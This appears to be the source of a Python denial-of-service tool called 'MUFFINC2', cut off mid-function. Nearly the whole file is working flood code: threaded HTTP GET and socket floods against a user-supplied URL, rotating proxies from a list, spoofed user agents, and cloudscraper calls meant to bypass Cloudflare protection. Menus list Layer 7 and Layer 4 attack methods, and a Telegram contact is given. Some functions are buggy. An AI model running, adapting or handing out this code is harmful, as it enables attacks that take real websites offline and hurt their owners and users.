#Credit : Karma-DDoS 

############################################################################################################################################################################################################################################################################################################################################################################

global user_agents
user_agents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36']
import cloudscraper, requests, httpx, time, os, socket, socks, ssl, threading, random, struct, sys, colorama, re
from bs4 import BeautifulSoup
from urllib.parse import *
from requests.cookies import RequestsCookieJar
import undetected_chromedriver as webdriver
import fake_useragent
from sys import *
from fake_useragent import UserAgent
from colorama import *

############################################################################################################################################################################################################################################################################################################################################################################

global success, info, fail
success, info, fail = Fore.GREEN + Style.BRIGHT, Fore.YELLOW + \
    Style.BRIGHT, Fore.RED + Style.BRIGHT
red = '\033[1;91m'
white = '\033[0m'
green = '\033[1;32m'
yellow = '\033[1;33m'
blue = '\033[1;34m'
red_t = '\033[0;31;40m'
gray = '\033[1;37;40m'
gold = '\033[0;33m'
purple = '\033[1;35m'
class color():
    def white():
        white = '\033[0m'
        return white
    def gold():
        gold = '\033[0;33m'
        return gold
    def yellow():
        yellow = '\033[1;33m'
        return yellow
    def red():
        red = '\033[1;91m'
        return red
    def green():
        green = '\033[1;32m'
        return green
    def purple():
        purple = '\033[1;35m'
        return purple
def makedir():
    try:
        os.mkdir('LOGS')
    except FileExistsError:
        pass
makedir()
def savelog(url):
    try:
        response = requests.get(url)
        head = response.headers
        ray = response.headers.get("CF-Ray")
        code = response.status_code
        server = response.headers.get("Server")
        results = "{}\n{}\n{}\n{}\n{}\n\n".format(url, code, ray, server, head)
        target = 'LOGS/logs'
        def log(target):
            file = open((target) + ".txt", "a")
            file.write(str(results))
            file.write("\n")
            file.close
            file_name = target
        log(target)
        print(results)
    except Exception as e:
        print(e)
def countdown(t):
    t = t+'0000'
    t = int(t)
    while True:
        t -= 1
        if t > 0:
            stdout.flush()
            print(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"Time Left : {}".format(t), end='\r')
        else:
            stdout.flush()
            print(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"Attack Completed! ")
            return
def layer7_target():
    url = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"URL             "+'\033[1;35m'+': '+'\033[0m')
    threadsi = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"THRD            "+'\033[1;35m'+': '+'\033[0m')
    t = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"TIME            "+'\033[1;35m'+': '+'\033[0m')
    return url, threadsi, t
def layer4_target():
    ip = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"IP              "+'\033[1;35m'+': '+'\033[0m')
    port = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"PORT            "+'\033[1;35m'+': '+'\033[0m')
    threadsi = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"THRD            "+'\033[1;35m'+': '+'\033[0m')
    t = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"TIME            "+'\033[1;35m'+': '+'\033[0m')
    return ip, port, threadsi, t
def clear():
    if os.name == 'posix':
        os.system('clear')
    elif os.name == 'nt':
        os.system('cls')
class logo():
    def main():
        clear()
        logo = f""+'\033[0m'+"\t\t╔══════"+'\033[1;35m'+"════════════════════════════╗ \n"
        logo += "\t\t║       "+'\033[0m'+"WELCOME TO MUFFINC2!"+'\033[1;35m'+"       ║ \n"
        logo += "\t\t║  "+'\033[0m'+"Type 'help' to see the command"+'\033[1;35m'+"  ║ \n"
        logo += "\t\t║ "+'\033[0m'+"Contact At Telegram : @MrSanZzXe"+'\033[1;35m'+" ║ \n"
        logo += "\t\t╚══════════════════════════"+'\033[0m'+"════════╝ \n"
        print(logo)
    def help():
        clear()
        logo = f""+'\033[0m'+"\t\t╔══════"+'\033[1;35m'+"════════════════════════════╗ \n"
        logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"Layer7 "+'\033[1;35m'+"       | "+'\033[0m'+"Show Layer7   "+'\033[1;35m'+" ║ \n"
        logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"Layer4 "+'\033[1;35m'+"       | "+'\033[0m'+"Show Layer4   "+'\033[1;35m'+" ║ \n"
        logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"Tools "+'\033[1;35m'+"        | "+'\033[0m'+"Show All Tools"+'\033[1;35m'+" ║ \n"
        logo += "\t\t╚══════════════════════════"+'\033[0m'+"════════╝ \n"
        print(logo)
    def layer7():
        clear()
        logo = f""+'\033[0m'+"\t\t╔══════"+'\033[1;35m'+"════════════════════════════╗ \n"
        logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"SKY "+'\033[1;35m'+"         | "+'\033[0m'+"Flood Sky Method"+'\033[1;35m'+"║ \n"
        logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"PXSKY "+'\033[1;35m'+"       | "+'\033[0m'+"Flood Sky Method"+'\033[1;35m'+"║ \n"
        logo += "\t\t║                | "+'\033[0m'+"With Proxy      "+'\033[1;35m'+"║ \n"
        logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"CFB "+'\033[1;35m'+"         | "+'\033[0m'+"CF Bypass      "+'\033[1;35m'+" ║ \n"
        logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"PXSTAR "+'\033[1;35m'+"      | "+'\033[0m'+"PXStar Flood   "+'\033[1;35m'+" ║ \n"
        logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"ION "+'\033[1;35m'+"         | "+'\033[0m'+"Lazer FLOOD    "+'\033[1;35m'+" ║ \n"
        logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"PXCFB "+'\033[1;35m'+"       | "+'\033[0m'+"Proxy CF Flood "+'\033[1;35m'+" ║ \n"
        logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"PXCFPRO "+'\033[1;35m'+"     | "+'\033[0m'+"Proxy CFPRO    "+'\033[1;35m'+" ║ \n"
        logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"PPS "+'\033[1;35m'+"         | "+'\033[0m'+"PPS Flood      "+'\033[1;35m'+" ║ \n"
        logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"BYPASS1 "+'\033[1;35m'+"     | "+'\033[0m'+"Bypass Flood   "+'\033[1;35m'+" ║ \n"
        logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"BYPASS2 "+'\033[1;35m'+"     | "+'\033[0m'+"Bypass Flood   "+'\033[1;35m'+" ║ \n"
        logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"CFSOC "+'\033[1;35m'+"       | "+'\033[0m'+"CF Flood Socket"+'\033[1;35m'+" ║ \n"
        logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"CFPRO "+'\033[1;35m'+"       | "+'\033[0m'+"CF Flood PRO   "+'\033[1;35m'+" ║ \n"
        logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"STRESSER V1"+'\033[1;35m'+"  | "+'\033[0m'+"STRESSER V1    "+'\033[1;35m'+" ║ \n"
        logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"STRESSER V2 "+'\033[1;35m'+" | "+'\033[0m'+"STRESSER V2    "+'\033[1;35m'+" ║ \n"
        logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"PWN "+'\033[1;35m'+"         | "+'\033[0m'+"Pwn a site     "+'\033[1;35m'+" ║ \n"
        logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"GET "+'\033[1;35m'+"         | "+'\033[0m'+"Flood With     "+'\033[1;35m'+" ║ \n"
        logo += "\t\t║                | "+'\033[0m'+"Get Method      "+'\033[1;35m'+"║ \n"
        logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"POST "+'\033[1;35m'+"        | "+'\033[0m'+"Flood With     "+'\033[1;35m'+" ║ \n"
        logo += "\t\t║                | "+'\033[0m'+"Post Method     "+'\033[1;35m'+"║ \n"
        logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"HEAD "+'\033[1;35m'+"        | "+'\033[0m'+"Flood With     "+'\033[1;35m'+" ║ \n"
        logo += "\t\t║                | "+'\033[0m'+"Head Method     "+'\033[1;35m'+"║ \n"
        logo += "\t\t╚══════════════════════════"+'\033[0m'+"════════╝ \n"
        print(logo)
    def layer4(): #udp tcp tls syn ack esp icmp ssh
        clear()
        logo = f""+'\033[0m'+"\t\t╔══════"+'\033[1;35m'+"════════════════════════════╗ \n"
        logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"UDP "+'\033[1;35m'+"         | "+'\033[0m'+"UDP Flood      "+'\033[1;35m'+" ║ \n"
        logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"TCP "+'\033[1;35m'+"         | "+'\033[0m'+"TCP Flood      "+'\033[1;35m'+" ║ \n"
        logo += "\t\t╚══════════════════════════"+'\033[0m'+"════════╝ \n"
        print(logo)
    def tools(): #udp tcp tls syn ack esp icmp ssh
        clear()
        logo = f""+'\033[0m'+"\t\t╔══════"+'\033[1;35m'+"════════════════════════════╗ \n"
        logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"crawl "+'\033[1;35m'+"       | "+'\033[0m'+"Web Crawler    "+'\033[1;35m'+" ║ \n"
        logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"ping "+'\033[1;35m'+"        | "+'\033[0m'+"Ping Site      "+'\033[1;35m'+" ║ \n"
        logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"proxyhunt "+'\033[1;35m'+"   | "+'\033[0m'+"Hunt random    "+'\033[1;35m'+" ║ \n"
        logo += "\t\t║                | "+'\033[0m'+"proxy           "+'\033[1;35m'+"║ \n"
        logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"siteinfo "+'\033[1;35m'+"    | "+'\033[0m'+"site info      "+'\033[1;35m'+" ║ \n"
        logo += "\t\t╚══════════════════════════"+'\033[0m'+"════════╝ \n"
        print(logo)
class DDOS():
    try:
        ################LAYER 7################
        def CFB():
            def SCFB(url, threadsi, t):
                scraper = cloudscraper.create_scraper()
                for _ in range(int(threadsi)):
                    ts = threading.Thread(target=ACFB, args=(scraper, url, t))
                    ts.start()
            def ACFB(scraper, url, t):
                if int(t) > 0:
                    try:
                        response = scraper.get(url, timeout=15)
                        response = scraper.get(url, timeout=15)
                        savelog(url)
                    except:
                        pass
            if __name__ == '__main__':
                url, threadsi, t = layer7_target()
                timer = threading.Thread(target=countdown, args=(t,))
                timer.start()
                SCFB(url, threadsi, t)
                timer.join()
        def PXCFB():
            def SPXCFB(url, threadsi, t):
                scraper = cloudscraper.create_scraper()
                for _ in range(int(threadsi)):
                    ts = threading.Thread(target=APXCFB, args=(scraper, url, t))
                    ts.start()
            def APXCFB(scraper, url, t):
                ip_list = open('ip_list.txt', 'r')
                ips = ip_list.readlines()
                ip_list.close()
                proxzy = ips
                proxy = {
                    'http://': 'http://'+str(random.choice(list(proxzy))),
                    'https://': 'http://'+str(random.choice(list(proxzy))),
                }
                if int(t) > 0:
                    try:
                        response = scraper.get(url, proxies=proxy)
                        response = scraper.get(url, proxies=proxy)
                        savelog(url)
                    except Exception as e:
                        pass
            if __name__ == '__main__':
                url, threadsi, t = layer7_target()
                timer = threading.Thread(target=countdown, args=(t,))
                timer.start()
                SPXCFB(url, threadsi, t)
                timer.join()
        def SKY():
            ip_list = open('ip_list.txt', 'r')
            ips = ip_list.readlines()
            ip_list.close()
            proxzy = ips
            def ASKY(url, threadsi, t):
                for _ in range(int(threadsi)):
                    ts = threading.Thread(target=LSKY, args=(url, t))
                    ts.start()
            def LSKY(url, t):
                try:
                    ua = random.choice(user_agents)
                    req = "GET / HTTP/1.1\r\nHost: {}\r\n".format(urlparse(url))
                    req += "Connection: keep-alive\r\n"
                    req += "User-Agent: {}\r\n".format(ua)
                    req += "Cache-Control: no-cache\r\n"
                    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
                    req += "Sec-Fetch-Site: same-origin\r\n"
                    req += "Sec-GPC: 1\r\n"
                    req += "Upgrade-Insecure-Requests: 10\r\n"
                    req += "Content-Length: 1000\r\n"
                    if int(t) > 0:
                        try:
                            proxy = random.choice(proxzy).strip().split(":")
                            s = socks.socksocket()
                            s.connect((str(urlparse(url).netloc), int(443)))
                            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
                            zzl = ssl.SSLContext()
                            s = zzl.wrap_socket(s, server_hostname=urlparse(url).netloc)
                            s.send(str(req).encode())
                            try:
                                for _ in range(200):
                                    s.send(str(req).encode())
                            except:
                                s.close()
                        except:
                            s.close()
                except Exception:
                    pass
            if __name__ == '__main__':
                url, threadsi, t = layer7_target()
                timer = threading.Thread(target=countdown, args=(t,))
                timer.start()
                ASKY(url, threadsi, t)
                timer.join()
        def PPS():
            ua = UserAgent()
            def SPPS(url, threadsi, t):
                s = socks.socksocket()
                for _ in range(int(threadsi)):
                    ts = threading.Thread(target=APPS, args=(url, t, s))
                    ts.start()
            def APPS(url, t, s):
                heads = "GET / HTTP/1.1\r\nHost: {}\r\n".format(url)
                heads += "Connection: keep-alive\r\nCache-Control: no-cache\r\nSec-Fetch-Site: same-origin\r\n"
                heads += "Content-Length: 1000\r\nSec-GPC: 1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
                heads += "User-Agent: {}\r\n".format(ua.chrome)
                if int(t) > 0:
                    try:
                        s.connect((urlparse(url).netloc, int(443)))
                        s.send(str(heads).encode())
                        for i in range(200):
                            try:
                                s.send(str(heads).encode())
                            except:
                                s.close()
                    except:
                        s.close()
            if __name__ == '__main__':
                url, threadsi, t = layer7_target()
                timer = threading.Thread(target=countdown, args=(t,))
                timer.start()
                SPPS(url, threadsi, t)
                timer.join()
        def ION():
            spr = cloudscraper.create_scraper()
            def SION(url, threadsi, t):
                for _ in range(int(threadsi)):
                    ts = threading.Thread(target=AION, args=(spr, url ,t))
                    ts.start()
            def AION(spr, url, t):
                client = httpx.Client(http2=True)
                if int(t) > 0:
                    try:
                        response = spr.get(url, timeout=15)
                        response = requests.get(url, timeout=15)
                        savelog(url)
                        client.get(url, timeout=15)
                    except:
                        pass
            if __name__ == '__main__':
                url, threadsi, t = layer7_target()
                timer = threading.Thread(target=countdown, args=(t,))
                timer.start()
                SION(url, threadsi, t)
                timer.join
        def CFPRO():
            def SCFP(url, threadsi, t):
                for _ in range(int(threadsi)):
                    ts = threading.Thread(target=ACFP, args=(url, t))
                    ts.start()
            def ACFP(url, t):
                ua = UserAgent()
                header = {
                    "Cache-Control": "no-cache",
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "100",
                    "Content-Length": "1000",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-GPC": "1",
                    "User-Agent": ua.chrome,
                    "Host": url
                }
                data = {
                    "X": "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
                    "Y": "YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY",
                    "Z": "ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ"
                }
                session = requests.Session()
                s = cloudscraper.create_scraper(disableCloudflareV1=True, sess=session)
                if int(t) > 0:
                    try:
                        s.get(url, headers=header, data=data, timeout=15, verify=False)
                        s.get(url, headers=header, data=data, timeout=15)
                        for i in range(100):
                            s.get(url, headers=header, timeout=15)
                    except:
                        pass
            if __name__ == '__main__':
                url, threadsi, t = layer7_target()
                timer = threading.Thread(target=countdown, args=(t,))
                timer.start()
                SCFP(url, threadsi, t)
                timer.join()
        def BYPASS1():
            def SBS(url, threadsi, t):
                for _ in range(int(threadsi)):
                    ts = threading.Thread(target=ABS, args=(url, t))
                    ts.start()
            def ABS(url, t):
                ua = UserAgent()
                header = {
                    "Cache-Control": "no-cache",
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "100",
                    "Content-Length": "1000",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-GPC": "1",
                    "User-Agent": ua.chrome,
                    "Host": url
                }
                scrp = cloudscraper.create_scraper(disableCloudflareV1=True)
                client = httpx.Client(http2=True)
                if int(t) > 0:
                    try:
                        scrp.get(url, headers=header, timeout=15)
                        response = requests.get(url, headers=header, timeout=15)
                        savelog(url)
                        client.get(url, headers=header, timeout=15)
                    except:
                        pass
            if __name__ == '__main__':
                url, threadsi, t = layer7_target()
                timer = threading.Thread(target=countdown, args=(t,))
                timer.start()
                SBS(url, threadsi, t)
                timer.join()
        def PXCFPRO():
            def SPXCFP(url, threadsi, t):
                for _ in range(int(threadsi)):
                    ts = threading.Thread(target=APXCFP, args=(url, t))
                    ts.start()
            def APXCFP(url, t):
                ip_list = open('ip_list.txt', 'r')
                ips = ip_list.readlines()
                ip_list.close()
                proxzy = ips
                proxy = random.choice(proxzy)
                ua = UserAgent()
                header = {
                    "Cache-Control": "no-cache",
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "100",
                    "Content-Length": "1000",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-GPC": "1",
                    "User-Agent": ua.chrome,
                }
                data = {
                    "X": "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
                    "Y": "YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY",
                    "Z": "ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ"
                }
                session = requests.Session()
                s = cloudscraper.create_scraper(disableCloudflareV1=True, sess=session)
                if int(t) > 0:
                    try:
                        s.get(url, headers=header, data=data, timeout=15, verify=False, proxies=proxy)
                        s.get(url, headers=header, data=data, timeout=15, proxies=proxy)
                        for i in range(100):
                            s.get(url, headers=header, timeout=15, proxies=proxy)
                    except Exception as e:
                        exit()
            if __name__ == '__main__':
                url, threadsi, t = layer7_target()
                timer = threading.Thread(target=countdown, args=(t,))
                timer.start()
                SPXCFP(url, threadsi, t)
                timer.join()
        def CFSOC():
            def SCFS(url, threadsi, t, port):
                for _ in range(int(threadsi)):
                    ts = threading.Thread(target=ACFS, args=(url, t, port))
                    ts.start()
            def ACFS(url, t, port):
                heads = "User-Agent: Googlebot/2.1 (+http://www.googlebot.com/bot.html)"
                heads += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
                heads += "Accept-Language: en-US,en;q=0.9"
                heads += "Accept-Encoding: gzip, deflate"
                heads += "Connection: keep-alive"
                pack = socks.socksocket()
                pack.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                pack.connect((str(url), int(port)))
                if int(t) > 0:
                    try:
                        for _ in range(10):
                            pack.send(str(heads).encode())
                    except:
                        pack.close()
                        pass
            if __name__ == '__main__':
                url, threadsi, t = layer7_target()
                port = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"PORT            "+'\033[1;35m'+': '+'\033[0m')
                timer = threading.Thread(target=countdown, args=(t,))
                timer.start()
                SCFS(url, threadsi, t, port)
                timer.join()
        def BYPASS2():
            ip_list = open('ip_list.txt', 'r')
            ips = ip_list.readlines()
            ip_list.close()
            proxzy = ips
            proxy = random.choice(proxzy)
            def SBS(url, threadsi, t):
                for _ in range(int(threadsi)):
                    ts = threading.Thread(target=ABS, args=(url, t))
                    ts.start()
            def ABS(url, t):
                ua = UserAgent()
                header = {
                    "Cache-Control": "no-cache",
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "100",
                    "Content-Length": "1000",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-GPC": "1",
                    "User-Agent": ua.chrome,
                    "Host": url
                }
                scrp = cloudscraper.create_scraper(disableCloudflareV1=True)
                client = httpx.Client(
                    http2=True,
                    proxies={
                        'http://': 'http://'+random.choice(proxzy),
                        'https://': 'http://'+random.choice(proxzy),
                    }
                )
                if int(t) > 0:
                    try:
                        scrp.get(url, headers=header, timeout=15, verify=False, proxies=proxy)
                        response = requests.get(url, headers=header, timeout=15, verify=False, proxies=proxy)
                        savelog(url)
                        client.get(url, headers=header, timeout=15, verify=False)
                    except:
                        pass
            if __name__ == '__main__':
                url, threadsi, t = layer7_target()
                timer = threading.Thread(target=countdown, args=(t,))
                timer.start()
                SBS(url, threadsi, t)
                timer.join()
        def STRESSERV1():
                ua = UserAgent()
                scraper = cloudscraper.create_scraper(disableCloudflareV1=True)
                def SS(url, threadsi, t):
                    for _ in range(int(threadsi)):
                        ts = threading.Thread(target=AS, args=(scraper, t, url))
                        ts.start()
                def AS(scraper, t, url):
                    ip_list = open('ip_list.txt', 'r')
                    ips = ip_list.readlines()
                    ip_list.close()
                    proxzy = ips
                    proxy = random.choice(proxzy)
                    client = httpx.Client(
                        http2=True,
                        proxies={
                            'http://': 'http://'+random.choice(proxzy),
                            'https://': 'http://'+random.choice(proxzy),
                        }
                    )
                    header = {
                        "Cache-Control": "no-cache",
                        "Connection": "keep-alive",
                        "Upgrade-Insecure-Requests": "100",
                        "Content-Length": "1000",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                        "Sec-Fetch-Site": "same-origin",
                        "Sec-GPC": "1",
                        "User-Agent": ua.chrome,
                        "Host": url
                    }
                    data = {
                        "X": "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
                        "Y": "YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY",
                        "Z": "ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ"
                    }
                    if int(t) > 0:
                        try:
                            for i in range(50):
                                response = scraper.get(url, headers=header, data=data, verify=False, timeout=15)
                                client.get(url, headers=header, data=data, verify=False, timeout=15)
                                response = requests.get(url, headers=header, data=data, verify=False, timeout=15)
                                savelog(url)
                        except:
                            pass
                if __name__ == '__main__':
                    url, threadsi, t = layer7_target()
                    timer = threading.Thread(target=countdown, args=(t,))
                    timer.start()
                    SS(url, threadsi, t)
                    timer.join()
        def STRESSERV2():
                ua = UserAgent()
                scraper = cloudscraper.create_scraper(disableCloudflareV1=True)
                def SS(url, threadsi, t):
                    for _ in range(int(threadsi)):
                        ts = threading.Thread(target=AS, args=(scraper, t, url))
                        ts.start()
                def AS(scraper, t, url):
                    ip_list = open('ip_list.txt', 'r')
                    ips = ip_list.readlines()
                    ip_list.close()
                    try:
                        proxy = random.choice(ips)
                        header = {
                            "Cache-Control": "no-cache",
                            "Connection": "keep-alive",
                            "Upgrade-Insecure-Requests": "100",
                            "Content-Length": "1000",
                            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                            "Sec-Fetch-Site": "same-origin",
                            "Sec-GPC": "1",
                            "User-Agent": ua.chrome,
                            "Host": url
                        }
                        data = {
                            "X": "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
                            "Y": "YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY",
                            "Z": "ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ",
                            "G": "GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG"
                        }
                        req = "GET / HTTP/1.1\r\nHost: {}\r\n".format(urlparse(url))
                        req += "Connection: keep-alive\r\n"
                        req += "User-Agent: {}\r\n".format(ua)
                        req += "Cache-Control: no-cache\r\n"
                        req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
                        req += "Sec-Fetch-Site: same-origin\r\n"
                        req += "Sec-GPC: 1\r\n"
                        req += "Upgrade-Insecure-Requests: 10\r\n"
                        req += "Content-Length: 1000\r\n"
                        if 'https://' in url:
                            port = 80
                        else:
                            port = 443
                        if int(t) > 0:
                            try:
                                for i in range(50):
                                    response = scraper.get(url, headers=header, data=data, verify=False, timeout=15, proxies=proxy)
                                    httpx.get(url, headers=header, data=data, verify=False, timeout=15, proxies=proxy)
                                    response = requests.get(url, headers=header, data=data, verify=False, timeout=15, proxies=proxy)
                                    savelog(url)
                            except:
                                pass
                    except Exception as e:
                        print("An error occurred: ", e, ', Please contact : @MrSanZzXe on telegram!')
                        pass
                if __name__ == '__main__':
                    url, threadsi, t = layer7_target()
                    timer = threading.Thread(target=countdown, args=(t,))
                    timer.start()
                    SS(url, threadsi, t)
                    timer.join()
        def PWNED():
            def start_pwn(url, threadsi, t):
                s = cloudscraper.create_scraper()
                for _ in range(int(threadsi)):
                    tr = threading.Thread(target=attack_pwn(), args=(s, url, threadsi))
                    tr.start()
            def attack_pwn(s, url, threadsi):
                ip_list = open('ip_list.txt', 'r')
                ips = ip_list.readlines()
                ip_list.close()
                if int(t) > 0:
                    try:
                        ua = UserAgent()
                        header = {
                            "Cache-Control": "no-cache",
                            "Connection": "keep-alive",
                            "Upgrade-Insecure-Requests": "100",
                            "Content-Length": "1000",
                            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                            "Sec-Fetch-Site": "same-origin",
                            "Sec-GPC": "1",
                            "User-Agent": ua.chrome
                        }
                        proxy = random.choice(ips)
                        s.get(url, headers=header, proxies=proxy)
                        response = requests.get(url, headers=header, proxies=proxy)
                        savelog(url)
                    except Exception as e:
                        print(e)
                        exit()
            if __name__ == '__main__':
                url, threadsi, t = layer7_target()
                timer = threading.Thread(target=countdown, args=(t,))
                timer.start()
                start_pwn(url, threadsi, t)
                timer.join()
        def PXSKY():
            def start_pxsky(url, threadsi, t):
                scraper = cloudscraper.create_scraper()
                ip = open('ip_list.txt', 'r')
